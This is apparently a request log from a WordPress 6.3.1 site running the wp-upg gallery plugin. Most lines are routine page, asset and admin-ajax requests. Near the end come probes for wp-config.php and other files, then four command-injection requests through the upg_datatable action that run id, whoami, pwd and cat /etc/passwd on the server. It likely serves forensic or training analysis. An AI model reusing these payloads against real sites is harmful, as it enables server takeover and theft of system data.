/wordpress/wp-includes/js/zxcvbn.min.js
/wordpress/wp-login.php
/wordpress/wp-cron.php?doing_wp_cron=1695876461.7606439590454101562500
/wordpress/wp-admin/css/l10n.min.css?ver=6.3.1
/wordpress/wp-admin/css/forms.min.css?ver=6.3.1
/wordpress/wp-includes/css/buttons.min.css?ver=6.3.1
/wordpress/wp-includes/css/dashicons.min.css?ver=6.3.1
/wordpress/wp-admin/css/login.min.css?ver=6.3.1
/wordpress/wp-includes/js/jquery/jquery.min.js?ver=3.7.0
/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1
/wordpress/wp-includes/js/zxcvbn-async.min.js?ver=1.0
/wordpress/wp-includes/js/dist/vendor/wp-polyfill-inert.min.js?ver=3.1.2
/wordpress/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.11
/wordpress/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0
/wordpress/wp-includes/js/dist/hooks.min.js?ver=c6aec9a8d4e5a5d543a1
/wordpress/wp-includes/js/dist/i18n.min.js?ver=7701b0c3857f914212ef
/wordpress/wp-admin/js/password-strength-meter.min.js?ver=6.3.1
/wordpress/wp-includes/js/underscore.min.js?ver=1.13.4
/wordpress/wp-includes/js/wp-util.min.js?ver=6.3.1
/wordpress/wp-admin/js/user-profile.min.js?ver=6.3.1
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-admin/
/wordpress/wp-includes/js/thickbox/thickbox.css?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=6.3.1
/wordpress/wp-includes/js/imgareaselect/imgareaselect.css?ver=0.9.8
/wordpress/wp-content/plugins/wp-upg/css/aristo.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/admin.css?ver=6.3.1
/wordpress/wp-includes/css/editor.min.css?ver=6.3.1
/wordpress/wp-admin/js/common.min.js?ver=6.3.1
/wordpress/wp-includes/js/hoverintent-js.min.js?ver=2.2.1
/wordpress/wp-includes/js/admin-bar.min.js?ver=6.3.1
/wordpress/wp-includes/js/clipboard.min.js?ver=2.0.11
/wordpress/wp-includes/js/dist/dom-ready.min.js?ver=392bdd43726760d1f3ca
/wordpress/wp-includes/js/dist/a11y.min.js?ver=7032343a947cfccf5608
/wordpress/wp-includes/js/api-request.min.js?ver=6.3.1
/wordpress/wp-includes/js/dist/url.min.js?ver=8814d23f2d64864d280d
/wordpress/wp-admin/js/site-health.min.js?ver=6.3.1
/wordpress/wp-includes/js/wp-ajax-response.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/jquery.color.min.js?ver=2.2.0
/wordpress/wp-includes/js/wp-lists.min.js?ver=6.3.1
/wordpress/wp-includes/js/quicktags.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/jquery.query.js?ver=2.2.3
/wordpress/wp-admin/js/edit-comments.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/core.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.2
/wordpress/wp-admin/js/postbox.min.js?ver=6.3.1
/wordpress/wp-includes/js/dist/vendor/moment.min.js?ver=2.29.4
/wordpress/wp-includes/js/dist/deprecated.min.js?ver=73ad3591e7bc95f4777a
/wordpress/wp-includes/js/dist/date.min.js?ver=505e060585ac0f4b6cb6
/wordpress/wp-admin/js/dashboard.min.js?ver=6.3.1
/wordpress/wp-includes/js/thickbox/thickbox.js?ver=3.1-20121105
/wordpress/wp-admin/js/plugin-install.min.js?ver=6.3.1
/wordpress/wp-includes/js/wp-sanitize.min.js?ver=6.3.1
/wordpress/wp-admin/js/updates.min.js?ver=6.3.1
/wordpress/wp-includes/js/shortcode.min.js?ver=6.3.1
/wordpress/wp-admin/js/media-upload.min.js?ver=6.3.1
/wordpress/wp-admin/js/svg-painter.js?ver=6.3.1
/wordpress/wp-includes/js/heartbeat.min.js?ver=6.3.1
/wordpress/wp-includes/js/wp-auth-check.min.js?ver=6.3.1
/wordpress/wp-includes/js/backbone.min.js?ver=1.4.1
/wordpress/wp-includes/js/wp-backbone.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-models.min.js?ver=6.3.1
/wordpress/wp-includes/js/plupload/wp-plupload.min.js?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.17
/wordpress/wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-views.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-editor.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-audiovideo.min.js?ver=6.3.1
/wordpress/wp-includes/js/mce-view.min.js?ver=6.3.1
/wordpress/wp-includes/js/imgareaselect/jquery.imgareaselect.min.js?ver=6.3.1
/wordpress/wp-admin/js/image-edit.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/draggable.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/slider.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/jquery.ui.touch-punch.js?ver=0.2.2
/wordpress/wp-admin/js/iris.min.js?ver=1.1.1
/wordpress/wp-admin/js/color-picker.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/jquery.form.min.js?ver=4.3.0
/wordpress/wp-includes/js/jquery/ui/datepicker.min.js?ver=1.13.2
/wordpress/wp-includes/js/wplink.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/tabs.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/menu.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/autocomplete.min.js?ver=1.13.2
/wordpress/wp-includes/js/wp-emoji-release.min.js?ver=6.3.1
/wordpress/wp-admin/admin-ajax.php?action=dashboard-widgets&widget=dashboard_primary&pagenow=dashboard
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/index.php
/wordpress/wp-admin/update-core.php
/wordpress/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-pointer,widgets&load%5Bchunk_1%5D=,site-icon,l10n,buttons,wp-color-picker,media-views&ver=6.3.1
/wordpress/wp-admin/themes.php
/wordpress/wp-content/themes/twentytwentyone/screenshot.png?ver=1.9
/wordpress/wp-content/themes/twentytwentytwo/screenshot.png?ver=1.5
/wordpress/wp-content/themes/twentytwentythree/screenshot.png?ver=1.2
/wordpress/wp-includes/js/customize-base.min.js?ver=6.3.1
/wordpress/wp-admin/js/theme.min.js?ver=6.3.1
/wordpress/index.php/post-video-url/
/wordpress/index.php/post-video-url/
/wordpress/index.php/post-video-url/
/wordpress/index.php/post-video-url/
/wordpress/wp-admin/edit.php?post_type=upg
/wordpress/wp-content/plugins/wp-upg/images/noimg.png
/wordpress/wp-content/uploads/2023/09/black.png
/wordpress/wp-content/uploads/2023/09/hash-password-anoynymous-833x554-1.jpg
/wordpress/wp-content/uploads/2023/09/6f26ddd1bf59740c536d2274bb834a05.png
/wordpress/wp-admin/js/tags-suggest.min.js?ver=6.3.1
/wordpress/wp-admin/js/inline-edit-post.min.js?ver=6.3.1
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/edit-comments.php
/wordpress/wp-admin/edit.php?post_type=page
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/index.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-cron.php?doing_wp_cron=1695880678.2136380672454833984375
/wordpress/wp-admin/edit-comments.php
/wordpress/wp-admin/edit-comments.php
/wordpress/wp-admin/options-general.php
/wordpress/wp-admin/tools.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-cron.php?doing_wp_cron=1695883628.6665210723876953125000
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-cron.php?doing_wp_cron=1695887228.8415451049804687500000
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-cron.php?doing_wp_cron=1695890828.9063448905944824218750
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/
/wordpress/wp-includes/blocks/navigation/style.min.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/jquery.fancybox.min.css?ver=2.18
/wordpress/wp-content/plugins/wp-upg/css/grids-responsive-min.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/style.css?ver=2.18
/wordpress/wp-content/plugins/wp-upg/css/pure-min.css?ver=6.3.1
/wordpress/wp-includes/blocks/navigation/view-modal.min.js?ver=b478fa3cd1475dec97d3
/wordpress/wp-includes/blocks/navigation/view.min.js?ver=886680af40b7521d60fc
/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1
/wordpress/wp-includes/js/jquery/jquery.min.js?ver=3.7.0
/wordpress/wp-content/plugins/wp-upg/js/common.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/filter-tags.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_delete.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/jquery.zoom.js?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/js/jquery.fancybox.min.js
/wordpress/wp-content/plugins/wp-upg/js/jquery.tagsinput.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_oembed.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_load_more.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_ajax_post.js?ver=2.18
/wordpress/wp-includes/js/wp-emoji-release.min.js?ver=6.3.1
/wordpress/wp-admin/admin-ajax.php
*
/wordpress/wp-admin/admin-ajax.php
/wordpress/
/wordpress/wp-includes/blocks/navigation/style.min.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/pure-min.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/style.css?ver=2.18
/wordpress/wp-content/plugins/wp-upg/css/grids-responsive-min.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/jquery.fancybox.min.css?ver=2.18
/wordpress/wp-includes/blocks/navigation/view.min.js?ver=886680af40b7521d60fc
/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1
/wordpress/wp-content/plugins/wp-upg/js/jquery.tagsinput.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/filter-tags.js?ver=2.18
/wordpress/wp-includes/js/jquery/jquery.min.js?ver=3.7.0
/wordpress/wp-includes/blocks/navigation/view-modal.min.js?ver=b478fa3cd1475dec97d3
/wordpress/wp-content/plugins/wp-upg/js/upg_delete.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/jquery.zoom.js?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/js/common.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_load_more.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_oembed.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_ajax_post.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/jquery.fancybox.min.js
/wordpress/wp-includes/js/wp-emoji-release.min.js?ver=6.3.1
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-image/
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-content/themes/twentytwentythree/assets/fonts/inter/Inter-VariableFont_slnt,wght.ttf
/wordpress/wp-admin/admin-ajax.php
*
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/
/wordpress/index.php/post-image/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/edit-upg-post/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/blog/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-video-url/
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/index.php
/wordpress/wp-includes/js/thickbox/thickbox.css?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=6.3.1
/wordpress/wp-includes/js/imgareaselect/imgareaselect.css?ver=0.9.8
/wordpress/wp-content/plugins/wp-upg/css/aristo.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/admin.css?ver=6.3.1
/wordpress/wp-includes/css/editor.min.css?ver=6.3.1
/wordpress/wp-includes/js/dist/i18n.min.js?ver=7701b0c3857f914212ef
/wordpress/wp-admin/js/common.min.js?ver=6.3.1
/wordpress/wp-includes/js/hoverintent-js.min.js?ver=2.2.1
/wordpress/wp-includes/js/admin-bar.min.js?ver=6.3.1
/wordpress/wp-includes/js/clipboard.min.js?ver=2.0.11
/wordpress/wp-includes/js/underscore.min.js?ver=1.13.4
/wordpress/wp-includes/js/wp-util.min.js?ver=6.3.1
/wordpress/wp-includes/js/dist/dom-ready.min.js?ver=392bdd43726760d1f3ca
/wordpress/wp-includes/js/dist/a11y.min.js?ver=7032343a947cfccf5608
/wordpress/wp-includes/js/api-request.min.js?ver=6.3.1
/wordpress/wp-includes/js/dist/url.min.js?ver=8814d23f2d64864d280d
/wordpress/wp-admin/js/site-health.min.js?ver=6.3.1
/wordpress/wp-includes/js/wp-ajax-response.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/jquery.color.min.js?ver=2.2.0
/wordpress/wp-includes/js/wp-lists.min.js?ver=6.3.1
/wordpress/wp-includes/js/quicktags.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/jquery.query.js?ver=2.2.3
/wordpress/wp-admin/js/edit-comments.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/core.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.2
/wordpress/wp-admin/js/postbox.min.js?ver=6.3.1
/wordpress/wp-includes/js/dist/vendor/moment.min.js?ver=2.29.4
/wordpress/wp-includes/js/dist/deprecated.min.js?ver=73ad3591e7bc95f4777a
/wordpress/wp-admin/js/dashboard.min.js?ver=6.3.1
/wordpress/wp-includes/js/thickbox/thickbox.js?ver=3.1-20121105
/wordpress/wp-admin/js/plugin-install.min.js?ver=6.3.1
/wordpress/wp-includes/js/dist/date.min.js?ver=505e060585ac0f4b6cb6
/wordpress/wp-includes/js/wp-sanitize.min.js?ver=6.3.1
/wordpress/wp-admin/js/updates.min.js?ver=6.3.1
/wordpress/wp-includes/js/shortcode.min.js?ver=6.3.1
/wordpress/wp-admin/js/media-upload.min.js?ver=6.3.1
/wordpress/wp-admin/js/svg-painter.js?ver=6.3.1
/wordpress/wp-includes/js/heartbeat.min.js?ver=6.3.1
/wordpress/wp-includes/js/wp-auth-check.min.js?ver=6.3.1
/wordpress/wp-includes/js/backbone.min.js?ver=1.4.1
/wordpress/wp-includes/js/wp-backbone.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-models.min.js?ver=6.3.1
/wordpress/wp-includes/js/plupload/wp-plupload.min.js?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.17
/wordpress/wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-views.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-editor.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-audiovideo.min.js?ver=6.3.1
/wordpress/wp-includes/js/mce-view.min.js?ver=6.3.1
/wordpress/wp-includes/js/imgareaselect/jquery.imgareaselect.min.js?ver=6.3.1
/wordpress/wp-admin/js/image-edit.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/draggable.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/slider.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/jquery.ui.touch-punch.js?ver=0.2.2
/wordpress/wp-admin/js/iris.min.js?ver=1.1.1
/wordpress/wp-admin/js/color-picker.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/jquery.form.min.js?ver=4.3.0
/wordpress/wp-includes/js/jquery/ui/datepicker.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/tabs.min.js?ver=1.13.2
/wordpress/wp-includes/js/wplink.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/menu.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/autocomplete.min.js?ver=1.13.2
/wordpress/license.txt
/wordpress/wp-admin/update-core.php
/wordpress/wp-includes/js/wp-emoji-release.min.js?ver=6.3.1
/wordpress/readme.html
/wordpress/wp-content/
/wordpress/wp-config.php
/wordpress/wp-content/plugins/akismet/akismet.php
/wordpress/wp-admin/install.php
/wordpress/wp-content/uploads/
/wordpress/wp-content/upgrade/
/wordpress/wp-includes/
/wordpress/wp-includes/rss-functions.php
/wordpress/wp-cron.php
/wordpress/wp-login.php
*
*
*
*
*
*
*
*
/wordpress/index.php/edit-upg-post/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-image/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-video-url/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/edit-upg-post/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/blog/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-video-url/
/wordpress/index.php/post-video-url/
/wordpress/index.php/post-video-url/
/wordpress/index.php/users-photo-gallery/
/wordpress/wp-includes/css/buttons.min.css?ver=6.3.1
/wordpress/wp-includes/css/dashicons.min.css?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=6.3.1
/wordpress/wp-includes/css/media-views.min.css?ver=6.3.1
/wordpress/wp-includes/js/imgareaselect/imgareaselect.css?ver=0.9.8
/wordpress/wp-includes/js/utils.min.js?ver=6.3.1
/wordpress/wp-includes/js/plupload/plupload.min.js?ver=2.1.9
/wordpress/wp-includes/js/plupload/moxie.min.js?ver=1.3.5
/wordpress/wp-content/uploads/2023/09/hash-password-anoynymous-833x554-1.jpg
/wordpress/wp-content/uploads/2023/09/black.png
/wordpress/wp-content/plugins/wp-upg/images/noimg.png
/wordpress/wp-content/uploads/2023/09/6f26ddd1bf59740c536d2274bb834a05.png
/wordpress/wp-includes/js/underscore.min.js?ver=1.13.4
/wordpress/wp-includes/js/shortcode.min.js?ver=6.3.1
/wordpress/wp-includes/js/backbone.min.js?ver=1.4.1
/wordpress/wp-includes/js/wp-util.min.js?ver=6.3.1
/wordpress/wp-includes/js/wp-backbone.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-models.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/core.min.js?ver=1.13.2
/wordpress/wp-includes/js/plupload/wp-plupload.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.2
/wordpress/wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.js?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.17
/wordpress/wp-includes/js/api-request.min.js?ver=6.3.1
/wordpress/wp-includes/js/dist/vendor/wp-polyfill-inert.min.js?ver=3.1.2
/wordpress/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.11
/wordpress/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0
/wordpress/wp-includes/js/dist/dom-ready.min.js?ver=392bdd43726760d1f3ca
/wordpress/wp-includes/js/dist/hooks.min.js?ver=c6aec9a8d4e5a5d543a1
/wordpress/wp-includes/js/dist/i18n.min.js?ver=7701b0c3857f914212ef
/wordpress/wp-includes/js/dist/a11y.min.js?ver=7032343a947cfccf5608
/wordpress/wp-includes/js/clipboard.min.js?ver=2.0.11
/wordpress/wp-includes/js/media-editor.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-views.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-audiovideo.min.js?ver=6.3.1
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-image/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/blog/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/edit-upg-post/
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:id:NULL:NULL
/wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL
/wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:cat%20/etc/passwd:NULL:NULL
/wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:pwd:NULL:NULL
